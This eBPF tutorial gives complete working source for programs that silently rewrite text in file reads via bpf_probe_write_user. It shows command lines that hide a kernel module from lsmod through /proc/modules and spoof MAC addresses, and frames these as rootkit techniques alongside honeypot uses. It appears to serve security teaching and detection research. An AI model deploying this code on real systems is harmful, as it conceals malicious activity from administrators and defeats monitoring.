# eBPF Tutorial: Transparent Text Replacement in File Reads

When you read a file in Linux, you trust that what you see matches what's stored on disk. But what if the kernel itself was lying to you? This tutorial demonstrates how eBPF programs can intercept file read operations and silently replace text before applications ever see it—creating a powerful capability for both defensive security monitoring and offensive rootkit techniques.

Unlike traditional file modification that leaves traces in timestamps and audit logs, this approach manipulates data in-flight during the read system call. The file on disk remains untouched, yet every program reading it sees modified content. This technique has legitimate uses in security research, honeypot deployment, and anti-malware deception, but also reveals how rootkits can hide their presence from system administrators.

> The complete source code: <https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/27-replace>

## Use Cases: From Security to Deception

Text replacement in file reads serves several purposes across the security spectrum. For defenders, it enables honeypot systems that present fake credentials to attackers, or deception layers that make malware believe it's succeeded when it hasn't. Security researchers use it to study malware behavior by feeding controlled data to suspicious processes.

On the offensive side, rootkits use this exact technique to hide their presence. The classic example is hiding kernel modules from `lsmod` by replacing their names in `/proc/modules` with whitespace or other module names. Malware can spoof MAC addresses by modifying reads from `/sys/class/net/*/address`, defeating sandbox detection that looks for virtual machine identifiers.

The key insight is that this operates at the system call boundary—after the kernel reads the file but before the userspace process sees the data. No matter how many times you `cat` the file or open it in different editors, you'll always see the modified version, because the eBPF program intercepts every read operation.

## Architecture: Multi-Stage Text Scanning and Replacement

This implementation is more sophisticated than simple string replacement. The challenge is working within eBPF's constraints: limited stack size, no unbounded loops, and strict verifier checks. To handle arbitrarily large files and multiple matches, the program uses a three-stage approach with tail calls to chain eBPF programs together.

The first stage (`find_possible_addrs`) scans through the read buffer looking for characters that match the first character of our search string. It can't do full string matching yet due to complexity limits, so it just marks potential locations. These addresses are stored in `map_name_addrs` for the next stage.

The second stage (`check_possible_addresses`) is tail-called from the first. It examines each potential match location and performs full string comparison using `bpf_strncmp`. This verifies whether we actually found our target text. Confirmed matches go into `map_to_replace_addrs`.

The third stage (`overwrite_addresses`) loops through confirmed match locations and uses `bpf_probe_write_user` to overwrite the text with the replacement string. Because both strings must be the same length (to avoid shifting memory and corrupting the buffer), users must pad their replacement text to match.

This pipeline handles the verifier's complexity limits by splitting the work across multiple programs, each staying under the instruction count threshold. Tail calls provide the glue, allowing one program to pass control to the next with the same context.

## Implementation Details

Let's examine the complete eBPF code that implements this three-stage pipeline:

```c
// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "replace.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// Map to hold the File Descriptors from 'openat' calls
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, unsigned int);
} map_fds SEC(".maps");

// Map to fold the buffer sized from 'read' calls
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buff_addrs SEC(".maps");

// Map to fold the buffer sized from 'read' calls
// NOTE: This should probably be a map-of-maps, with the top-level
// key bing pid_tgid, so we know we're looking at the right program
#define MAX_POSSIBLE_ADDRS 500
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_POSSIBLE_ADDRS);
    __type(key, unsigned int);
    __type(value, long unsigned int);
} map_name_addrs SEC(".maps");
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_POSSIBLE_ADDRS);
    __type(key, unsigned int);
    __type(value, long unsigned int);
} map_to_replace_addrs SEC(".maps");

// Map holding the programs for tail calls
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");

// Optional Target Parent PID
const volatile int target_ppid = 0;

// These store the name of the file to replace text in
const volatile int filename_len = 0;
const volatile char filename[50];

// These store the text to find and replace in the file
const volatile  unsigned int text_len = 0;
const volatile char text_find[FILENAME_LEN_MAX];
const volatile char text_replace[FILENAME_LEN_MAX];

SEC("tp/syscalls/sys_exit_close")
int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check if we're a process thread of interest
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }

    // Closing file, delete fd from all maps to clean up
    bpf_map_delete_elem(&map_fds, &pid_tgid);
    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);

    return 0;
}

SEC("tp/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }

    // Get filename from arguments
    char check_filename[FILENAME_LEN_MAX];
    bpf_probe_read_user(&check_filename, filename_len, (char*)ctx->args[1]);

    // Check filename is our target
    for (int i = 0; i < filename_len; i++) {
        if (filename[i] != check_filename[i]) {
            return 0;
        }
    }

    // Add pid_tgid to map for our sys_exit call
    unsigned int zero = 0;
    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);

    bpf_printk("[TEXT_REPLACE] PID %d Filename %s\n", pid, filename);
    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;

    // Set the map value to be the returned file descriptor
    unsigned int fd = (unsigned int)ctx->ret;
    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (pfd == 0) {
        return 0;
    }

    // Check this is the correct file descriptor
    unsigned int map_fd = *pfd;
    unsigned int fd = (unsigned int)ctx->args[0];
    if (map_fd != fd) {
        return 0;
    }

    // Store buffer address from arguments in map
    long unsigned int buff_addr = ctx->args[1];
    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);

    // log and exit
    size_t buff_size = (size_t)ctx->args[2];
    bpf_printk("[TEXT_REPLACE] PID %d | fd %d | buff_addr 0x%lx\n", pid, fd, buff_addr);
    bpf_printk("[TEXT_REPLACE] PID %d | fd %d | buff_size %lu\n", pid, fd, buff_size);
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int find_possible_addrs(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is reading our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;
    long unsigned int buff_addr = *pbuff_addr;
    long unsigned int name_addr = 0;
    if (buff_addr <= 0) {
        return 0;
    }

    // This is amount of data returned from the read syscall
    if (ctx->ret <= 0) {
        return 0;
    }
    long int buff_size = ctx->ret;
    unsigned long int read_size = buff_size;

    bpf_printk("[TEXT_REPLACE] PID %d | read_size %lu | buff_addr 0x%lx\n", pid, read_size, buff_addr);
    // 64 may be to large for loop
    char local_buff[LOCAL_BUFF_SIZE] = { 0x00 };

    if (read_size > (LOCAL_BUFF_SIZE+1)) {
        // Need to loop :-(
        read_size = LOCAL_BUFF_SIZE;
    }

    // Read the data returned in chunks, and note every instance
    // of the first character of our 'to find' text.
    // This is all very convoluted, but is required to keep
    // the program complexity and size low enough the pass the verifier checks
    unsigned int tofind_counter = 0;
    for (unsigned int i = 0; i < loop_size; i++) {
        // Read in chunks from buffer
        bpf_probe_read(&local_buff, read_size, (void*)buff_addr);
        for (unsigned int j = 0; j < LOCAL_BUFF_SIZE; j++) {
            // Look for the first char of our 'to find' text
            if (local_buff[j] == text_find[0]) {
                name_addr = buff_addr+j;
                // This is possibly out text, add the address to the map to be
                // checked by program 'check_possible_addrs'
                bpf_map_update_elem(&map_name_addrs, &tofind_counter, &name_addr, BPF_ANY);
                tofind_counter++;
            }
        }

        buff_addr += LOCAL_BUFF_SIZE;
    }

    // Tail-call into 'check_possible_addrs' to loop over possible addresses
    bpf_printk("[TEXT_REPLACE] PID %d | tofind_counter %d \n", pid, tofind_counter);

    bpf_tail_call(ctx, &map_prog_array, PROG_01);
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int check_possible_addresses(struct trace_event_raw_sys_exit *ctx) {
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;
    long unsigned int* pName_addr = 0;
    long unsigned int name_addr = 0;
    unsigned int newline_counter = 0;
    unsigned int match_counter = 0;

    char name[text_len_max+1];
    unsigned int j = 0;
    char old = 0;
    const unsigned int name_len = text_len;
    if (name_len < 0) {
        return 0;
    }
    if (name_len > text_len_max) {
        return 0;
    }
    // Go over every possibly location
    // and check if it really does match our text
    for (unsigned int i = 0; i < MAX_POSSIBLE_ADDRS; i++) {
        newline_counter = i;
        pName_addr = bpf_map_lookup_elem(&map_name_addrs, &newline_counter);
        if (pName_addr == 0) {
            break;
        }
        name_addr = *pName_addr;
        if (name_addr == 0) {
            break;
        }
        bpf_probe_read_user(&name, text_len_max, (char*)name_addr);
        // for (j = 0; j < text_len_max; j++) {
        //     if (name[j] != text_find[j]) {
        //         break;
        //     }
        // }
        // we can use bpf_strncmp here,
        // but it's not available in the kernel version older than 5.17
        if (bpf_strncmp(name, text_len_max, (const char *)text_find) == 0) {
            // ***********
            // We've found out text!
            // Add location to map to be overwritten
            // ***********
            bpf_map_update_elem(&map_to_replace_addrs, &match_counter, &name_addr, BPF_ANY);
            match_counter++;
        }
        bpf_map_delete_elem(&map_name_addrs, &newline_counter);
    }

    // If we found at least one match, jump into program to overwrite text
    if (match_counter > 0) {
        bpf_tail_call(ctx, &map_prog_array, PROG_02);
    }
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int overwrite_addresses(struct trace_event_raw_sys_exit *ctx) {
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;
    long unsigned int* pName_addr = 0;
    long unsigned int name_addr = 0;
    unsigned int match_counter = 0;

    // Loop over every address to replace text into
    for (unsigned int i = 0; i < MAX_POSSIBLE_ADDRS; i++) {
        match_counter = i;
        pName_addr = bpf_map_lookup_elem(&map_to_replace_addrs, &match_counter);
        if (pName_addr == 0) {
            break;
        }
        name_addr = *pName_addr;
        if (name_addr == 0) {
            break;
        }

        // Attempt to overwrite data with out replace string (minus the end null bytes)
        long ret = bpf_probe_write_user((void*)name_addr, (void*)text_replace, text_len);
        // Send event
        struct event *e;
        e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
        if (e) {
            e->success = (ret == 0);
            e->pid = pid;
            bpf_get_current_comm(&e->comm, sizeof(e->comm));
            bpf_ringbuf_submit(e, 0);
        }
        bpf_printk("[TEXT_REPLACE] PID %d | [*] replaced: %s\n", pid, text_find);

        // Clean up map now we're done
        bpf_map_delete_elem(&map_to_replace_addrs, &match_counter);
    }

    return 0;
}
```

The program starts with the familiar pattern of tracking file opens. When a process opens our target file (specified via the `filename` constant), we record its file descriptor in `map_fds`. This lets us identify reads from that specific file later.

The interesting part begins in `handle_read_enter`, where we capture the buffer address that userspace passed to the `read()` system call. This address is where the kernel will write the file contents, and crucially, it's also where we can modify them before the userspace process looks at the data.

The main logic lives in `find_possible_addrs`, attached to `sys_exit_read`. After the kernel completes the read operation, we scan through the buffer looking for potential matches. The constraint here is that we can't do unbounded loops—the verifier would reject that. So we read in chunks of `LOCAL_BUFF_SIZE` bytes and scan for the first character of our search string. Each potential match address goes into `map_name_addrs`.

Once we've scanned the buffer, we use a tail call to jump into `check_possible_addresses`. This program iterates through the potential matches and performs full string comparison using `bpf_strncmp` (available in kernel 5.17+). Confirmed matches move to `map_to_replace_addrs`. If we found any matches, we tail-call once more into `overwrite_addresses`.

The final stage, `overwrite_addresses`, performs the actual modification using `bpf_probe_write_user`. It loops through confirmed match locations and overwrites each one with the replacement text. The requirement that both strings have the same length prevents buffer corruption—we're doing in-place replacement without shifting any memory.

## Tail Calls and Verifier Constraints

The use of tail calls (`bpf_tail_call`) is critical here. eBPF programs face strict complexity limits—the verifier analyzes every possible execution path to ensure the program terminates and doesn't access invalid memory. A single program that does scanning, matching, and replacement would exceed these limits.

Tail calls provide a way to chain programs while bypassing the cumulative instruction count. When `find_possible_addrs` calls `bpf_tail_call(ctx, &map_prog_array, PROG_01)`, it's essentially jumping to a different program (`check_possible_addresses`) with the same context. The current program's execution ends, and the new program starts with a fresh instruction count budget.

The userspace loader must populate `map_prog_array` with file descriptors for the tail-called programs before attaching anything. This is done in the userspace code using `bpf_map_update_elem`, mapping index `PROG_01` to the `check_possible_addresses` program and `PROG_02` to `overwrite_addresses`.

This architecture demonstrates a key eBPF development pattern: when you hit verifier limits, split your logic into multiple programs and use tail calls to coordinate them.

## Practical Examples and Security Implications

Let's look at real-world use cases. Hiding kernel modules from detection:

```bash
./replace -f /proc/modules -i 'joydev' -r 'cryptd'
```

When any process reads `/proc/modules`, they'll see `cryptd` where `joydev` actually appears. The module is still loaded and functioning, but tools like `lsmod` can't see it. This is a classic rootkit technique.

Spoofing MAC addresses for anti-sandbox evasion:

```bash
./replace -f /sys/class/net/eth0/address -i '00:15:5d:01:ca:05' -r '00:00:00:00:00:00'
```

Malware often checks for virtualization by looking at MAC address prefixes (0x00:15:5d indicates Hyper-V). By replacing the actual MAC address with zeros, the malware's virtualization detection fails, making sandbox analysis easier.

The defensive flip side is using this for honeypot systems. You can present fake credentials in configuration files, or make malware believe it successfully compromised a system when it hasn't. The file content on disk remains secure, but attackers reading it see false information.

## Compilation and Execution

Compile the program:

```bash
cd src/27-replace
make
```

Run with specified file and text replacement:

```bash
sudo ./replace --filename /path/to/file --input foo --replace bar
```

Both `input` and `replace` must be the same length to avoid buffer corruption. To include newlines in bash, use `$'\n'`:

```bash
./replace -f /proc/modules -i 'joydev' -r $'aaaa\n'
```

The program intercepts all reads of the specified file and replaces matching text transparently. Press Ctrl-C to stop.

## Summary

This tutorial demonstrated how eBPF programs can intercept file read operations and modify data before userspace sees it, without altering the actual file. We explored the three-stage architecture using tail calls to work within verifier constraints, the use of `bpf_probe_write_user` for memory manipulation, and practical applications ranging from rootkit techniques to defensive honeypot deployment. Understanding these patterns is crucial for both offensive security research and building detection mechanisms that account for eBPF-based attacks.

> If you'd like to dive deeper into eBPF, check out our tutorial repository at <https://github.com/eunomia-bpf/bpf-developer-tutorial> or visit our website at <https://eunomia.dev/tutorials/>.

## References

- Original bad-bpf project: <https://github.com/pathtofile/bad-bpf>
- eBPF tail calls documentation: <https://docs.kernel.org/bpf/prog_sk_lookup.html>
- BPF verifier and program complexity: <https://www.kernel.org/doc/html/latest/bpf/verifier.html>
